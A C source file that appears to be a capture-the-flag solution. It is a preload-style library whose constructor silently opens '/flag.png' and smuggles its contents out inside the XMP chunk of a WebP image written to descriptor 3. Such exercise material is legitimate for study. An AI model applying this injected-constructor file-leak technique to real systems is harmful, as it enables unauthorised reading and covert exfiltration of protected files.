#include "miniwebp.h"
#include <asm/unistd_64.h>

#define SEEK_SET 0
#define SEEK_CUR 1
#define SEEK_END 2

#define AT_FDCWD		-100

#ifdef DEBUG
#define FLAG "../challenge/flag.png"
#define CONSTRUCT_ATTR
#else
#define FLAG "/flag.png"
#define CONSTRUCT_ATTR __attribute__((constructor))
#endif


typedef unsigned long long uint64_t;
typedef unsigned int uint32_t;
typedef long long int64_t;

_Static_assert(sizeof(uint32_t) == 4, "uint32_t does not match!");
_Static_assert(sizeof(uint64_t) == 8, "uint64_t does not match!");
_Static_assert(sizeof(int64_t) == 8, "int64_t does not match!");


uint64_t syscall(register uint64_t call_no, uint64_t arg0, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5) {
    register uint64_t call_no_asm asm("rax") = call_no;
    register uint64_t arg0_asm asm("rdi") = arg0;
    register uint64_t arg1_asm asm("rsi") = arg1;
    register uint64_t arg2_asm asm("rdx") = arg2;
    register uint64_t arg3_asm asm("r10") = arg3;
    register uint64_t arg4_asm asm("r8") = arg4;
    register uint64_t arg5_asm asm("r9") = arg5;

    uint64_t output;

    asm volatile(
        "syscall\n"
        "mov %%rax, %[output]\n"
        : [output] "=rm" (output)
        : "r"(call_no_asm), "r"(arg0_asm), "r"(arg1_asm), "r"(arg2_asm), "r"(arg3_asm), "r"(arg4_asm), "r"(arg5_asm)
    );

    return output;
}

int openat(int dirfd, const char* path, int oflag, uint64_t mode) {
    return (int) syscall(__NR_openat, (uint64_t)dirfd, (uint64_t)path, (uint64_t)oflag, mode, 0, 0);
}
int64_t lseek(int filedes, int64_t offset, int whence) {
    return (int64_t) syscall(__NR_lseek, (uint64_t)filedes, (uint64_t)offset, (uint64_t)whence, 0, 0, 0);
}
int64_t read(int filedes, void* buf, uint64_t count) {
    return (int64_t) syscall(__NR_read, (uint64_t)filedes, (uint64_t)buf, (uint64_t)count, 0, 0, 0);
}
int64_t write(int filedes, void* buf, uint64_t count) {
    return (int64_t) syscall(__NR_write, (uint64_t)filedes, (uint64_t)buf, (uint64_t)count, 0, 0, 0);
}
int close(int fd) {
    return (int) syscall(__NR_close, fd, 0, 0, 0, 0, 0);
}
int dup2(int oldfd, int newfd) {
    return (int) syscall(__NR_dup2, (uint64_t)oldfd, (uint64_t)newfd, 0, 0, 0, 0);
}

void kill() {
    syscall(__NR_exit, 42, 0, 0, 0, 0, 0);
}
void success() {
    syscall(__NR_exit, 0, 0, 0, 0, 0, 0);
}

void memset(char* buf, int c, uint64_t len) {
    for (uint64_t i = 0; i < len; i++)
        buf[i] = c;
}
    
const int out_fd = 3;

void CONSTRUCT_ATTR preload_init(void) {

    int flag_fd = openat(AT_FDCWD, FLAG, 0, 0);
    if (flag_fd < 0)
        kill();

    int64_t fsize = lseek(flag_fd, 0, SEEK_END);
    lseek(flag_fd, 0, SEEK_SET);
    if (fsize < 0)
        kill();

    uint64_t size = fsize + 8;
    // Size has to be even
    if (size & 1)
        size++;

    char buf[size];
    memset(buf, '\0', size);
    buf[0] = 'X';
    buf[1] = 'M';
    buf[2] = 'P';
    buf[3] = ' ';
    *((uint32_t*)(buf+4)) = fsize;
    int64_t ret = read(flag_fd, buf+8, fsize);
    if (ret < 0)
        kill();

    *((uint32_t*)(mini_webp + 4)) += size;
    mini_webp[0x14] |= 0b100; // XMP flag in VP8X

    write(out_fd, mini_webp, mini_webp_len);
    write(out_fd, buf, size);
    close(out_fd);

    success();
}

#ifdef DEBUG
#define O_WRONLY	     01
# define O_CREAT	   0100	/* Not fcntl.  */
# define O_TRUNC	  01000	/* Not fcntl.  */
void _start() {
    int fd = openat(AT_FDCWD, "./out.webp", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd != out_fd) {
        dup2(fd, out_fd);
        close(fd);
    }

    preload_init();
}

#endif
